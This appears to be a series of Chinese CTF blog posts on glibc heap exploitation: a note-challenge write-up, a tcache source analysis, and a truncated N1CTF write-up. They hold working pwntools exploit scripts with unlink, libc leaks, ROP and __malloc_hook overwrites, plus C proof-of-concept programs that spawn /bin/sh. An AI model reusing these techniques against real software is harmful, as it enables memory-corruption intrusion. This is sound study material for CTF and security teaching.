分析一下现状： 存在一个指针数组在bss段上，指针会指向堆地址 存在off-by-one，可以修改content所在堆块大小，但只能修改为特定值，且小于原来的堆块大小 content前块和后块内容均可以任意写 想到的一个思路是unlink，这样就可以劫持bss段的数组进而可以任意读任意写。 首先，想到content块会变小，如果与后面的堆空间unlink，会过不去libc的检测，因为没有指针指向后块地址，因此需要选择前块作为unlink的目标块，则size需要覆盖为pre_inuse为0的值（0x40），选定了这个值以后，前块的fake chunk就可以构造了。 然后，需要思考如何触发unlink。在第一次realloc时，libc会将改小的堆块放到fastbin中去，而这时需要如何触发unlink呢？ 在查看代码中发现，malloc_consolidate函数会对fastbin链中各个堆块进行遍历，对符合前后块！inuse的堆块做unlink，这样恰好符合需求。 在什么时候会触发malloc_consolidate呢？在_int_malloc 中发现，在申请较大堆块，导致前面的一系列分配均无法满足时，会触发该函数。因此，我选择申请0x21000大小的堆块，该堆块大于brk分配的初始堆大小，则一定可以触发malloc_consolidate 12345678910111213141516171819... /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in otherwise tend to fragment. */ else &#123; idx = largebin_index (nb); if (have_fastchunks (av)) malloc_consolidate (av); &#125;... 剩下的步骤，就是如何构造前后堆块使其在malloc_consolidate中可以通过系统的check了。 当这一步完成时，在bss段上的指针数组里，就出现交叉的情况了，通过编辑title内容，就可以对bss段数组上的数据任意写，并且可以写多次。 首先利用got表泄露libc地址，然后再泄露libc中environ变量的地址（栈地址），最后对返回地址写入rop，就可以拿到shell了（其实最简单的方法是对__malloc_hook写one_gadget，但测试过程中，libc的四个one_gadget均不可用…） EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *from ctypes import *debug = 0elf = ELF('./note')#flag&#123;t1-1_1S_0_sImPl3_n0T3&#125;if debug: p = remote('127.0.0.1', 1234)#process('./300') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug'else: p = remote('39.107.14.183', 1234) libc = ELF('./libc-2.23.so') #off = 0x001b0000 context.log_level = 'debug'def change_title(title): p.recvuntil('--&gt;&gt;') p.sendline('1') p.recvuntil('title:') p.send(title)def change_content(size,content): p.recvuntil('--&gt;&gt;') p.sendline('2') p.recvuntil('(64-256):') p.sendline(str(size)) p.recvuntil('content:') p.send(content)def change_comment(content): p.recvuntil('--&gt;&gt;') p.sendline('3') p.recvuntil('comment:') p.sendline(content)def show_content(): p.recvuntil('--&gt;&gt;') p.sendline('4')p.recvuntil('welcome to the note ')offset = int(p.recv(4),10)print '[*]', str(offset + 0x10),hex(offset +0x10)change_content(0x78,p64(0x41)*(8)+p64(0x80)*7+'\n')change_title(p64(0x11)+p64(0x81)+p64(0x602070-0x18)+p64(0x602070-0x10)+p64(0x20)+'@')change_content(150,'a'*110+'\n')change_title(p64(offset+0x10-0x20)+p64(0x81)+p64(0x602070-0x18)+p64(0x602070-0x10)+p64(0x20)+'a')change_content(0x21000,'a'*110+'\n')change_title(p64(0x602058)+p64(elf.got['puts'])+p64(0x78)+p64(0x602058)+'\n')show_content()p.recvuntil('is:')libc.address = u64(p.recv(6).ljust(8,'\0')) - libc.symbols['puts']print '[+] system: ',hex(libc.symbols['system'])change_comment(p64(0x602058)+p64(libc.symbols['environ'])+p64(0x78)+p64(0x602058)+'\n')show_content()p.recvuntil('is:')stack_addr = u64(p.recv(6).ljust(8,'\0'))print '[+] stack: ',hex(stack_addr)offset = 0x7fffffffe4b8- 0x7fffffffe338 change_comment(p64(stack_addr - offset )+p64(libc.symbols['environ'])+p64(0x78)+p64(0x602058)+'\n')change_comment(p64(0x0000000000401673)+p64(next(libc.search('/bin/sh')))+p64(libc.symbols['system']))p.interactive()'''Gadgets information============================================================0x000000000040166c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040166e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401670 : pop r14 ; pop r15 ; ret0x0000000000401672 : pop r15 ; ret0x000000000040166b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040166f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400e00 : pop rbp ; ret0x0000000000401673 : pop rdi ; ret0x0000000000401671 : pop rsi ; pop r15 ; ret0x000000000040166d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400c71 : ret0x00000000004002c1 : ret 0x2000x0000000000401300 : ret 0x89480x00000000004012f6 : ret 0x8b480x0000000000400fe5 : ret 0xb60fUnique gadgets found: 15''']]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tcache 源码分析及利用思路]]></title>
    <url>%2F2018%2F03%2F20%2Ftcache%2F</url>
    <content type="text"><![CDATA[tcache，全称是thread local caching，是libc 2.26版本中新增加的内存管理机制，属于一种缓存机制，处理逻辑位于malloc函数和free函数中，优先级较高，第一次见到这个结构是在34C3 CTF中的SimpleGC一题。 总体简介tcache是一个用于加速malloc分配的缓存结构，有由64个链表组成。其优先级很高，会先于全部的bin来处理。每个链表的个数是一定的，当缓存链表装满时，分配方式就与之前版本的malloc相同。但使用了tcache版本的malloc与free函数时，对于堆块的安全性检查就相比于之前的版本弱化很多。 本文依据的代码是libc 2.26，最新出的libc 2.27似乎与2.26相差不多，多了一个SINGLE_THREAD_P变量，用于细化单线程与多线程的处理逻辑，对此研究不深。 数据结构tcache增加了两个全新的结构体，tcache_entry、tcache_perthread_struct。并且在libc内部定义了两个线程局部变量，该局部变量使得在每一个线程内部维护一个tcache结构，当在某线程内部释放内存时，无论内存块属于哪个分配区，都会挂到释放该内存块线程的tcache中。 tcache_entry结构体，看上去并不明白是做什么用的，但在分析代码中发现，这就是一个单链表结构指针。 tcache_pthread_struct结构体，是一个线程tcache的主体，由两个数组组成。其中，entries数据代表tcache的各个链表，共TCACHE_MAX_BINS个（默认为64），counts数组代表每一个单链表内有多少个内存块。 这个tcache结构的组装与fastbin非常相似 1234567891011121314typedef struct tcache_entry&#123; struct tcache_entry *next;&#125; tcache_entry;typedef struct tcache_perthread_struct&#123; char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS];&#125; tcache_perthread_struct;static __thread char tcache_shutting_down = 0;static __thread tcache_perthread_struct *tcache = NULL; 常量定义：从常量中可以看出，默认配置情况下，结构体最多的单链表个数是64个，每个单链表中最多有7个内存块，可容纳的最大内存块大小是1032。 1234567891011121314151617181920# define TCACHE_MAX_BINS 64# define MAX_TCACHE_SIZE tidx2usize (TCACHE_MAX_BINS-1)/* Only used to pre-fill the tunables. */# define tidx2usize(idx) (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)/* When "x" is from chunksize(). */# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)/* When "x" is a user-provided size. */# define usize2tidx(x) csize2tidx (request2size (x))/* With rounding and alignment, the bins are... idx 0 bytes 0..24 (64-bit) or 0..12 (32-bit) idx 1 bytes 25..40 or 13..20 idx 2 bytes 41..56 or 21..28 etc. *//* This is another arbitrary limit, which tunables can change. Each tcache bin will hold at most this number of chunks. */# define TCACHE_FILL_COUNT 7 生成与调试这部分应该写在下一部分，不过在我刚开始动手调试时就遇到了问题，就是 __thread 变量的问题，这个变量是线程内访问的，所以当我在gdb中使用 p tcache 命令输出结构体时出现了错误： 12Cannot find thread-local storage for process 27690, shared library /lib/x86_64-linux-gnu/libc.so.6:Cannot find thread-local variables on this target 就很懵，调试时不能查看结构体数值不就很蛋疼么。。。然后在博客内请教了大佬，还没回我，我就继续分析代码，找到了解决问题的方法（如果有人知道如何直接查看，麻烦告知我） 在代码中发现了一个初始化函数 tcache_init() 12345678910111213141516171819202122232425262728293031323334static voidtcache_init(void)&#123; mstate ar_ptr; void *victim = 0; const size_t bytes = sizeof (tcache_perthread_struct); if (tcache_shutting_down) return; arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); if (!victim &amp;&amp; ar_ptr != NULL) &#123; ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); &#125; if (ar_ptr != NULL) __libc_lock_unlock (ar_ptr-&gt;mutex); /* In a low memory situation, we may not be able to allocate memory - in which case, we just keep trying later. However, we typically do this very early, so either there is sufficient memory, or there isn't enough memory to do non-trivial allocations anyway. */ if (victim) &#123; tcache = (tcache_perthread_struct *) victim; memset (tcache, 0, sizeof (tcache_perthread_struct)); &#125;&#125; 发现tcache是一个指针，而内存块居然是用_int_malloc生成的，这就是说我们可以不管这个线程局部变量，直接去找这块内存就好了。 继续跟踪函数调用，过程是 1234malloc __libc_malloc MAYBE_INIT_TCACHE tcache_init 而MAYBE_INIT_TCACHE的位置在arena_get之前，并且tcache_init中还包含arena_get函数。结合上一篇对于内存堆分配区的知识，这就可以判断，在对线程的分配区初始化之后，第一个分配的内存就是tcache内存块。 在主分配区该结构是heap段第一块内存，在非主分配应该在sub_heap和thread_state结构体以后 因此首先用vmmap 找到heap地址之后，就可以查看该结构体内容了，进而可以继续调试 1234567891011121314151617181920212223242526pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x555555554000 0x555555555000 r-xp 1000 0 /home/p4nda/Desktop/1 0x555555754000 0x555555755000 r--p 1000 0 /home/p4nda/Desktop/1 0x555555755000 0x555555756000 rw-p 1000 1000 /home/p4nda/Desktop/1 0x555555756000 0x555555777000 rw-p 21000 0 [heap] 0x7ffff79f5000 0x7ffff7bcb000 r-xp 1d6000 0 /lib/x86_64-linux-gnu/libc-2.26.so 0x7ffff7bcb000 0x7ffff7dcb000 ---p 200000 1d6000 /lib/x86_64-linux-gnu/libc-2.26.so 0x7ffff7dcb000 0x7ffff7dcf000 r--p 4000 1d6000 /lib/x86_64-linux-gnu/libc-2.26.so 0x7ffff7dcf000 0x7ffff7dd1000 rw-p 2000 1da000 /lib/x86_64-linux-gnu/libc-2.26.so 0x7ffff7dd1000 0x7ffff7dd5000 rw-p 4000 0 0x7ffff7dd5000 0x7ffff7dfc000 r-xp 27000 0 /lib/x86_64-linux-gnu/ld-2.26.so 0x7ffff7fe0000 0x7ffff7fe2000 rw-p 2000 0 0x7ffff7ff7000 0x7ffff7ffa000 r--p 3000 0 [vvar] 0x7ffff7ffa000 0x7ffff7ffc000 r-xp 2000 0 [vdso] 0x7ffff7ffc000 0x7ffff7ffd000 r--p 1000 27000 /lib/x86_64-linux-gnu/ld-2.26.so 0x7ffff7ffd000 0x7ffff7ffe000 rw-p 1000 28000 /lib/x86_64-linux-gnu/ld-2.26.so 0x7ffff7ffe000 0x7ffff7fff000 rw-p 1000 0 0x7ffffffde000 0x7ffffffff000 rw-p 21000 0 [stack]0xffffffffff600000 0xffffffffff601000 r-xp 1000 0 [vsyscall]pwndbg&gt; p *(struct tcache_perthread_struct *)0x555555756000$1 = &#123; counts = &quot;\000\000\000\000\000\000\000\000Q\002&quot;, &apos;\000&apos; &lt;repeats 53 times&gt;, entries = &#123;0x0 &lt;repeats 64 times&gt;&#125;&#125;pwndbg&gt; 堆分配差异当加入了tcache机制后，原来的ptmalloc的堆块释放与分配机制存在一定的改变，先看两个函数tcache_get、tcache_put，可以看出这两个函数与fastbin的取出和插入基本完全一样。 12345678910111213141516171819202122static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx)&#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);&#125;/* Caller must ensure that we know tc_idx is valid and there's available chunks to remove. */static __always_inline void *tcache_get (size_t tc_idx)&#123; tcache_entry *e = tcache-&gt;entries[tc_idx]; assert (tc_idx &lt; TCACHE_MAX_BINS); assert (tcache-&gt;entries[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next; --(tcache-&gt;counts[tc_idx]); return (void *) e;&#125; 内存块放入tcache内存释放可以看到，在free函数的最先处理部分，首先是检查释放块是否页对齐及前后堆块的释放情况，便优先放入tcache结构中。 12345678910111213141516171819202122232425262728293031323334353637383940414243_int_free (mstate av, mchunkptr p, int have_lock)&#123; INTERNAL_SIZE_T size; /* its size */ mfastbinptr *fb; /* associated fastbin */ mchunkptr nextchunk; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize; /* its size */ int nextinuse; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize; /* size of previous contiguous chunk */ mchunkptr bck; /* misc temp for linking */ mchunkptr fwd; /* misc temp for linking */ size = chunksize (p); /* Little security check which won't hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by "design" from some intruder. */ if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) malloc_printerr ("free(): invalid pointer"); /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size))) malloc_printerr ("free(): invalid size"); check_inuse_chunk(av, p);#if USE_TCACHE &#123; size_t tc_idx = csize2tidx (size); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) &#123; tcache_put (p, tc_idx); return; &#125; &#125;#endif......&#125; 内存申请在内存分配的malloc函数中有多处，会将内存块移入tcache中。 首先，申请的内存块符合fastbin大小时并且找到在fastbin内找到可用的空闲块时，会把该fastbin链上的其他内存块放入tcache中。 其次，申请的内存块符合smallbin大小时并且找到在smallbin内找到可用的空闲块时，会把该smallbin链上的其他内存块放入tcache中。 还有，当在unsorted bin链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到tcache中，继续处理。 （高能预警：代码经过剪切，仍然很长… ） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171static void *_int_malloc (mstate av, size_t bytes)&#123;... 变量定义 ...#if USE_TCACHE size_t tcache_unsorted_count; /* count of unsorted chunks processed */#endif... ======= 1. 申请块符合fastbin块大小 ======== if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) &#123; idx = fastbin_index (nb); mfastbinptr *fb = &amp;fastbin (av, idx); mchunkptr pp; victim = *fb; if (victim != NULL) &#123; if (SINGLE_THREAD_P) *fb = victim-&gt;fd; else REMOVE_FB (fb, pp, victim); if (__glibc_likely (victim != NULL)) &#123; size_t victim_idx = fastbin_index (chunksize (victim)); if (__builtin_expect (victim_idx != idx, 0)) malloc_printerr ("malloc(): memory corruption (fast)"); check_remalloced_chunk (av, victim, nb);#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != NULL) &#123; if (SINGLE_THREAD_P) *fb = tc_victim-&gt;fd; else &#123; REMOVE_FB (fb, pp, tc_victim); if (__glibc_unlikely (tc_victim == NULL)) break; &#125; tcache_put (tc_victim, tc_idx); &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; &#125;======= 2. 申请块符合smallbin块大小 ======== if (in_smallbin_range (nb)) &#123; idx = smallbin_index (nb); bin = bin_at (av, idx); if ((victim = last (bin)) != bin) &#123; bck = victim-&gt;bk; if (__glibc_unlikely (bck-&gt;fd != victim)) malloc_printerr ("malloc(): smallbin double linked list corrupted"); set_inuse_bit_at_offset (victim, nb); bin-&gt;bk = bck; bck-&gt;fd = bin; if (av != &amp;main_arena) set_non_main_arena (victim); check_malloced_chunk (av, victim, nb);#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; bck-&gt;fd = bin; tcache_put (tc_victim, tc_idx); &#125; &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125;...#if USE_TCACHE INTERNAL_SIZE_T tcache_nb = 0; size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) tcache_nb = nb; int return_cached = 0; tcache_unsorted_count = 0;#endif====== 循环处理unsorted bin内存块 ======== for (;; ) &#123; int iters = 0; while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) &#123;...... if (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123;...... &#125; /* remove from unsorted list */ unsorted_chunks (av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks (av); /* Take now instead of binning if exact fit */ if (size == nb) &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) set_non_main_arena (victim);#if USE_TCACHE /* Fill cache first, return to user only if cache fills. We may return one of these chunks later. */ if (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) &#123; tcache_put (victim, tc_idx); return_cached = 1; continue; &#125; else &#123;#endif check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p;#if USE_TCACHE &#125;#endif &#125;...&#125; 内存块从tcache中取出直接分配在内存申请的开始部分，首先会判断申请大小块，在tcache是否存在，如果存在就直接从tcache中摘取，否则再使用_int_malloc分配。 1234567891011121314151617181920212223242526272829303132void *__libc_malloc (size_t bytes)&#123; mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0));#if USE_TCACHE /* int_free also calls request2size, be careful to not pad twice. */ size_t tbytes = request2size (bytes); size_t tc_idx = csize2tidx (tbytes); MAYBE_INIT_TCACHE (); DIAG_PUSH_NEEDS_COMMENT; if (tc_idx &lt; mp_.tcache_bins /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */ &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != NULL) &#123; return tcache_get (tc_idx); &#125; DIAG_POP_NEEDS_COMMENT;#endif arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); ....&#125; 最大值限制在循环处理unsorted bin内存块是，如果达到放入unsorted bin块最大数量时，会立即返回。默认是0，即不存在上限。 1234567891011#if USE_TCACHE /* If we've processed as many chunks as we're allowed while filling the cache, return one of the cached ones. */ ++tcache_unsorted_count; if (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; 0 &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit) &#123; return tcache_get (tc_idx); &#125;#endif unsorted bin处理结束在循环处理unsorted bin内存块后，如果之前曾放入过tcache块，则会取出一个并返回。 1234567#if USE_TCACHE /* If all the small chunks we found ended up cached, return one now. */ if (return_cached) &#123; return tcache_get (tc_idx); &#125;#endif ​ 利用方式house_of_spirit当tcache存在时，释放堆块没有对堆块的前后堆块进行合法性校验，只需要构造本块对齐就可以成功将任意构造的堆块释放到tcache中，而在申请时，tcache对内部大小合适的堆块也是直接分配的，并且对于在tcache内任意大小的堆块管理方式是一样的，导致常见的house_of_spirit可以延伸到smallbin。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 #include &lt;stddef.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt; #include &lt;string.h&gt;typedef size_t INTERNAL_SIZE_T;struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;;typedef struct malloc_chunk* mchunkptr;int main(int argc, const char* argv[]) &#123; size_t fake_chunk_and_more[64]; void (* c)(char *) ; fake_chunk_and_more[5] = (size_t )puts; //If a funtion ptr stored here... printf("This example showcases how the House of Spirit became more powerful " \ " after the tcache patch\n"); printf("Filling space at and after the fake chunk with invalid data\n"); memset(fake_chunk_and_more, 'A', sizeof(fake_chunk_and_more)); printf("Building fake chunk on the stack at %p\n", (void *)fake_chunk_and_more); mchunkptr fake_chunk = (mchunkptr)(void *)fake_chunk_and_more; fake_chunk-&gt;size = 0x90; void *mem = (void*)((char*)fake_chunk + offsetof(struct malloc_chunk, fd)); free(mem); printf("Passed chunk to free, let's make an allocation for the fake size\n"); size_t *mem2 = malloc(0x80); mem2[3] = (size_t )system; printf("malloc(0x80) returned: %p\n", mem2); c = fake_chunk_and_more[5]; (*c)("/bin/sh"); return 0;&#125; tcache链表劫持可以发现，tcache链表的插入和摘除方式与fastbin是基本一致的，也同样可以对tcache的链表进行劫持，并且，由于分配内存时对size没有任何校验。因此，比fastbin dup更容易利用。 1234567891011121314151617181920212223242526272829303132#include &lt;malloc.h&gt;#include &lt;stddef.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;typedef struct tcache_entry&#123; struct tcache_entry *next;&#125; tcache_entry;size_t *chunksizep(void *mem) &#123; return (size_t *)(((char *)mem) - sizeof(size_t));&#125;int main(int argc, const char* argv[]) &#123; void (* c[6])(char *) ; printf("If there is a function ptr array here: %p\n",c); c[3] = puts; void *mem = malloc(0x80); printf("malloc a chunk here , %p. then free it\n ",mem); tcache_entry *victim = (tcache_entry *)mem; free(mem); victim-&gt;next = (void *)c; size_t *mem1 = malloc(0x80); size_t *mem2 = malloc(0x80); printf("malloc twice,get addr 1: %p,2: %p\n",mem1,mem2); mem2[3] = (size_t )system; (*c[3])("/bin/sh"); return 0;&#125; 堆溢出不完全应用于堆溢出，当内存块释放前，size位置被修改为任意包含在tcache范围内时，在释放后都可以被放置在tcache相应位置。 12345678910111213141516171819202122232425262728293031323334 #include &lt;malloc.h&gt; #include &lt;stddef.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt;typedef struct tcache_entry &#123; struct tcache_entry *next; &#125; tcache_entry; size_t *chunksizep(void *mem) &#123; return (size_t *)(((char *)mem) - sizeof(size_t)); &#125; int main(int argc, const char* argv[]) &#123; size_t *a = malloc(0x48); size_t *b = malloc(0x48); size_t *c = malloc(0x48); printf("first , we malloc 3 chunks,1: %p,2: %p,3: %p\n",a,b,c); void (* ptr)(char *) ; *c = puts; printf("overflow....\n"); memset(a, 'a', 0x48+1); printf("free middle of the three\n "); free(b); size_t * d = malloc(0x58); printf("then malloc a bigger chunk:%p\n ",d); d[0x58/sizeof(size_t)-1] = system; printf("%p,%p",c,&amp;d[0x58/sizeof(size_t)-1]); ptr = *c; (*ptr)("/bin/sh"); return 0; &#125; unlink此外，对于small bin大小的堆块，在smallbin中包含有空闲块的时候，会同时将同大小的其他空闲块，放入tcache中，此时也会出现解链操作，但相比于unlink宏，缺少了链完整性校验。因此，原本unlink操作在该条件下也可以使用。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; bck-&gt;fd = bin; tcache_put (tc_victim, tc_idx); &#125; &#125; &#125;#endif#define unlink(AV, P, BK, FD) &#123; \ if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \ malloc_printerr (check_action, "corrupted size vs. prev_size", P, AV); \ FD = P-&gt;fd; \ BK = P-&gt;bk; \ if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \ malloc_printerr (check_action, "corrupted double-linked list", P, AV); \ else &#123; \ FD-&gt;bk = BK; \ BK-&gt;fd = FD; \ if (!in_smallbin_range (chunksize_nomask (P)) \ &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123; \ if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) \ || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) \ malloc_printerr (check_action, \ "corrupted double-linked list (not small)", \ P, AV); \ if (FD-&gt;fd_nextsize == NULL) &#123; \ if (P-&gt;fd_nextsize == P) \ FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; \ else &#123; \ FD-&gt;fd_nextsize = P-&gt;fd_nextsize; \ FD-&gt;bk_nextsize = P-&gt;bk_nextsize; \ P-&gt;fd_nextsize-&gt;bk_nextsize = FD; \ P-&gt;bk_nextsize-&gt;fd_nextsize = FD; \ &#125; \ &#125; else &#123; \ P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; \ P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; \ &#125; \ &#125; \ &#125; \&#125; 首先，在tcache满的时候释放几个堆块到small bin中，再将原本的堆块malloc回去，使得tcache为空。再次malloc时，会从smallbin中分配，此时会把刚释放的同等大小堆块移入tcache中，此时会出现unlink。 Referencehttp://tukan.farm/2017/07/08/tcache/ http://ftp.gnu.org/gnu/glibc/ 34C3 CTF —— SimpleGC]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[N1CTF 2018 && 线程堆知识源代码分析]]></title>
    <url>%2F2018%2F03%2F15%2Fn1ctf2018%2F</url>
    <content type="text"><![CDATA[Nu1L队组织的一场国际赛，涉及的知识面很广，仅记录PWN题的第一道和第二道。 vote一道比较常规套路的fastbin利用方法，主要涉及的知识是fastbin堆块的劫持。 题目分析题目是一个投票系统，主要包括5个函数： 涉及的数据结构是投票者的票数和名字： 12340 8 16 ...+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| number | time | name ......... | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 这里的投票函数实现的很诡异，创建了一个新的线程，线程利用一个bss段上的变量传递线程参数，sleep 等待3s开始投票，出现一个问题，当在3s内有另外的投票时，会造成竞争条件，使第一人的票数投到第二人上。 说到诡异，这个取消函数就更诡异了，显然里面有一个UAF以及double free漏洞： 漏洞利用地址泄露利用UAF漏洞，首先申请一个超过global_max_fast的漏洞，这样在释放时，堆块会放到unsorted bin中，在unsorted bin的组织结构中，堆块的fd、bk指针会填充为main_arena+88这个地址，因而泄露了libc的地址。注意防止释放时被top块合并就好了。 Fastbin劫持同样还是利用UAF漏洞，fastbin是一个单链表结构，当可以控制一个堆块的fd指针的时候基本就可以实现任意地址分配。 首先，分配两个大小为0x70 的堆块，并且顺序释放，这样在fastbin中会形成单链表结构，单链表的第二块指向第一块的堆头。 这里的一个比较新的点是，这题的数据结构无法直接修改fd指针，但是由于UAF漏洞，当对一个已释放用户投票时，仍然修改了堆块的fd指针，理论上可以指向任意位置。 这里我选择将fd指针指向原位置+0x20的地址，因为这个地方可以编辑（上一个用户的name字段），因而伪造一个堆块，就可以再将fastbin劫持到其他地方，选择将堆块劫持到 __malloc_hook - 0x23的位置，这个位置是非页对齐的，但是在分配地址时并不检测，而且在libc 2.23库中，此处存在多个libc地址，当非页对齐看时，此处就有一个0x7f，恰好可绕过fastbin的size检测，另外还有一个malloc_assert检测，非常恰巧的一个值。 当可以控制__malloc_hook，将其覆盖为one_gadget，就可以直接通过malloc新的堆块来得到shell了。 解题脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283from pwn import *import time,base64debug=0elf = ELF('./vote')if debug: p= process('./vote') context.log_level = 'debug' libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') #gdb.attach(p)#,'b*0x0400F6D'else: p = remote('47.90.103.10',6000)#process('./pwn1') libc = ELF('./libc-2.23.so')def add(size,name): p.recvuntil('Action:') p.sendline('0') p.recvuntil('size') p.sendline(str(size)) p.recvuntil('name:') p.sendline(name)def show(index): p.recvuntil('Action:') p.sendline('1') p.recvuntil('index') p.sendline(str(index))def vote(index): p.recvuntil('Action:') p.sendline('2') p.recvuntil('index') p.sendline(str(index)) def cancel(index): 